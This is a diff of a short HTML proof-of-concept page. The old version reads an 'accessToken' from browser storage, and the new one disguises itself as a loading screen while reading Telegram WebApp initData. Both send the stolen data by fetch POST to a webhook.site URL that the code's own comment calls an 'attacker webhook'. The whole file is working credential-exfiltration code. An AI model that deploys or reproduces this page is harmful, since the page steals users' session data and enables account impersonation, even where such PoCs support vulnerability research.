@@ -2,26 +2,30 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>PoC: Token Exfil</title>
+  <title>PoC: Telegram WebApp initData</title>
 </head>
 <body>
-  <script>
-    // 1. Show confirmation popup
-    if (confirm("This page needs access. Click OK to continue.")) {
-      // 2. Try to extract access token
-      const token = localStorage.getItem('accessToken') || sessionStorage.getItem('accessToken');
-      
-      if (token) {
-        // 3. Send token to webhook
-        fetch("https://webhook.site/b5aff070-1f76-46f5-b381-179f78befc25", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ token })
-        });
-      } else {
-        alert("❌ Token not found in storage.");
-      }
-    }
-  </script>
+  <h1>Loading.....</h1>
+  <p>app is opening</p>
+
+  <!-- Load Telegram WebApp SDK -->
+<script src="https://telegram.org/js/telegram-web-app.js"></script>
+<script>
+  const initData = Telegram.WebApp.initData;
+  const initDataUnsafe = Telegram.WebApp.initDataUnsafe;
+
+  // Log for debug
+  console.log("🔐 Telegram initData:", initData);
+  console.log("🔓 Parsed initDataUnsafe:", initDataUnsafe);
+
+  // Exfiltrate to attacker webhook
+  fetch("https://webhook.site/b5aff070-1f76-46f5-b381-179f78befc25", {
+    method: "POST",
+    mode: "no-cors",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ initData, initDataUnsafe })
+  });
+</script>
+
 </body>
 </html>
